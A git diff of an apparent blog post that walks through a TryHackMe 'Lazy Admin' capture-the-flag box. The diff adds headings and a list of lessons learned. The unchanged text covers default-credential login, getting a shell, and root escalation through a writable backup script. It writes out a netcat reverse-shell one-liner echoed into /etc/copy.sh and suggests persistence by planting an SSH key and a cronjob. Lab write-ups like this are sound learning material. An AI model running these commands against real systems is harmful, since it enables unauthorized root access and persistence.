@@ -23,6 +23,8 @@ gobuster scan
 
 Looking into `/content/` we find a website. Running gobuster again we find some interesting sides e.g. a admin login portal.
 
+## Access
+
 Looking for default credentials for the side we are quite lucky and can login
 
 <img src="/assets/img/thm_pics/lazy_admin_login.png">
@@ -39,6 +41,8 @@ We can abuse the ad function to get a shell one the server
 
 <img src="/assets/img/thm_pics/lazy_admin_rev_shell_login.png">
 
+## Priv Esc
+
 Running `sudo -l` we are quite suprised since we can run `/usr/bin/perl` as root. Digging a bit deeper we can see that there is a backup script which runs `/etc/copy.sh`. We check if we can write into the file and indeed we can. There is no editor and we have to use echo to overwrite the script. 
 
 
@@ -47,10 +51,14 @@ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local-ip> 5554 >/tm
 {% endhighlight %}
 
 
-```
-echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local-ip> 5554 >/tmp/f' >/etc/copy.sh
-```
-
 <img src="/assets/img/thm_pics/lazy_admin_priv_esc.png">
 
 For persistence we could include our ssh key into the `/root/.ssh/aut_key` and include a cronjob. 
+
+## Learnings
+
+1. Do not rely on any assumption. Try out more or less everything which you think makes sense!
+2. Have a very close look on the findings you have and test them!
+3. Use searchsploit to search for exploits
+
+
